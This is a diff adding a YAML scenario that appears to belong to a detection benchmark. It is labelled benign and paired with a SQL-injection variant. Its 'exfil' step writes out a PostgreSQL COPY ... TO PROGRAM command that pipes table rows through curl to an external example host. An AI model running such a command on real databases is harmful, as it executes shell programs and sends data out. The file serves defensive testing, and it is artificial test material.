@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_86_sql_injection_ben_2624b
+family_id: gen_ecommerce_86_sql_injection_fam_2624
+domain: ecommerce
+time_of_day: '12:10'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT product_id, name FROM products WHERE order_id = 84642
+  - step_id: exfil
+    sql: COPY (SELECT product_id, name FROM products WHERE status = 'delivered') TO
+      PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 198.51.100.125
+      port: 9443
+matched_pair_id: gen_ecommerce_86_sql_injection_pair_2624
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
